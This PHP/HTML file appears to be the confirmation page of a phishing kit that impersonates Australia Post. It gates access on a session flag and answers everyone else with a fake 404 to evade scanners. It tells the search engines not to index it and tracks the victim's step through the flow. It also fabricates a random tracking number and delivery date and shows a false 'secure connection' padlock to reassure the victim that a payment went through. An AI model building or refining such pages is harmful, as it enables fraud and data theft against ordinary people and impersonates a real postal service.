<?php
session_start();
include 'lang_main.php';
// Validate MASTER session
if (!isset($_SESSION['MASTER']) || $_SESSION['MASTER'] !== true) {
    header("HTTP/1.0 404 Not Found");
    exit;
}
// TRACKING STEP
$_SESSION['step'] = 'finished';

// Generate dynamic delivery date that is +2 days from now
$date = new DateTime();
$date->modify('+2 days');
$delivery_date = $date->format('d/m/Y');
$ref_number = 'AU' . mt_rand(100000000, 999999999) . 'AU';

?>
<!DOCTYPE html>
<html lang="<?= $current_lang ?>">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex">
    <title><?= t('success_title') ?> | Australia Post</title>
    <link rel="icon" type="image/x-icon" href="assets/favicon.ico">
    <link rel="stylesheet" href="assets/post-branding.css?v=<?= time() ?>">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="assets/site.min.js"></script>
    <style>
        /* Clean & Refined Final Page */
        .page-title {
            font-size: 24px !important;
            font-weight: 700 !important;
            margin-bottom: 15px !important;
            color: #2e7d32; 
        }
        
        .page-subtitle {
            font-size: 15px;
            line-height: 1.6;
            color: #555;
            margin-bottom: 30px;
        }

        .success-icon {
            font-size: 60px;
            color: #2e7d32;
            margin-bottom: 20px;
        }
        
        .recap-box {
            background: #fafafa;
            border: 1px solid #e0e0e0;
            border-radius: 8px;
            padding: 20px;
            text-align: left;
            margin-bottom: 30px;
        }

        .recap-row {
            display: flex;
            justify-content: space-between;
            padding: 10px 0;
            border-bottom: 1px solid #eee;
            font-size: 14px;
        }

        .recap-row:last-child {
            border-bottom: none;
        }

        .recap-label {
            color: #666;
            font-weight: 500;
        }

        .recap-value {
            color: #222;
            font-weight: 700;
        }

        .status-badge {
            background: #e8f5e9;
            color: #2e7d32;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 12px;
            font-weight: 700;
        }

        .action-buttons {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        /* Language Selector Styles */
        .lang-selector {
            display: flex;
            gap: 12px;
            margin-right: 25px;
            font-size: 13px;
            font-weight: 500;
            padding-right: 25px;
            border-right: 1px solid #e0e0e0;
        }
        .lang-selector a {
            text-decoration: none;
            color: #666;
            transition: all 0.2s;
        }
        .lang-selector a:hover {
            color: #000;
        }
        .lang-selector a.active {
            color: #111;
            font-weight: 700;
            text-decoration: underline;
        }
        
        @media (max-width: 480px) {
            .lang-selector {
                margin-right: 15px;
                padding-right: 15px;
                gap: 8px;
                font-size: 12px;
            }
        }
        /* GLOBAL LAYOUT FIX */
        html {
            height: 100%;
        }
        body {
            min-height: 100%;
            display: flex;
            flex-direction: column;
            margin: 0;
            padding: 0;
            overflow-x: hidden;
            background-color: #f4f6f8;
            font-family: 'Frutiger', sans-serif;
            color: #333;
        }
        .post-header {
            flex-shrink: 0;
            background: #fff;
            padding: 15px 0;
            width: 100%;
            z-index: 10;
        }
        .post-footer {
            flex-shrink: 0;
            width: 100%;
        }
        .main-wrapper {
            flex-grow: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            padding: 20px;
            box-sizing: border-box;
            position: relative;
        }
        .content-container {
            width: 100%;
            display: flex;
            justify-content: center;
        }
        @media (max-width: 480px) {
            .main-wrapper { padding: 15px; }
            .form-card { margin: 0 auto; }
        }
    </style>
</head>
<body>
    <div class="post-yellow-bar"></div>
    <header class="post-header">
        <div class="header-container">
            <div class="logo-container">
                <img src="assets/POST.svg" alt="Australia Post" class="post-logo">
            </div>
            <div class="header-right">
                <div class="login-text">
                    <img src="assets/lock.svg" alt="Secure" class="lock-icon">
                    <span><?= t('secure_conn') ?></span>
                </div>
            </div>
        </div>
    </header>
    <main class="main-wrapper">
        <div class="content-container">
            <div class="stepper">
                <div class="step completed">1</div>
                <div class="step-line filled"></div>
                <div class="step completed">2</div>
                <div class="step-line filled"></div>
                <div class="step completed">3</div>
            </div>
            
            <div class="form-card" style="text-align: center;">
                <div class="success-icon">
                    <i class="fas fa-check-circle"></i>
                </div>
                
                <h1 class="page-title"><?= t('success_title') ?></h1>
                <p class="page-subtitle"><?= t('success_desc') ?></p>
                
                <div class="recap-box">
                    <div class="recap-row">
                        <span class="recap-label"><?= t('ref_label') ?></span>
                        <span class="recap-value"><?= $ref_number ?></span>
                    </div>
                    <div class="recap-row">
                        <span class="recap-label"><?= t('date_label') ?></span>
                        <span class="recap-value"><?= $delivery_date ?></span>
                    </div>
                    <div class="recap-row">
                        <span class="recap-label"><?= t('bene_label') ?></span>
                        <span class="recap-value">Australia Post</span>
                    </div>
                    <div class="recap-row">
                        <span class="recap-label"><?= t('status_label') ?></span>
                        <span class="status-badge"><i class="fas fa-check"></i> <?= t('status_ok') ?></span>
                    </div>
                </div>
                
            </div>
        </div>
    </main>
    <footer class="post-footer">
        <div class="footer-container">
            <!-- DESKTOP VERSION -->
            <div class="footer-desktop">
                <div class="footer-col">
                    <h4><?= t('help_contact') ?></h4>
                    <a href="#">FAQ</a>
                    <a href="#">Contact Center</a>
                    <a href="#">Support</a>
                </div>
                <div class="footer-col">
                    <h4><?= t('data_prot') ?></h4>
                    <a href="#"><?= t('cond_gen') ?></a>
                    <a href="#"><?= t('privacy_policy') ?></a>
                    <a href="#"><?= t('cookies') ?></a>
                </div>
                <div class="footer-col" style="justify-content:flex-end; align-items:flex-end; text-align:right;">
                    <img src="assets/POST.svg" height="28" style="opacity:0.4; margin-bottom:10px;">
                    <p style="font-size:11px; color:#999; margin:0;">
                        &copy; <?= date('Y') ?> Australia Post
                    </p>
                </div>
            </div>
            <!-- MOBILE VERSION -->
            <div class="footer-mobile">
                &copy; <?= date('Y') ?> <?= t('copyright') ?>
            </div>
        </div>
    </footer>
</body>
</html>
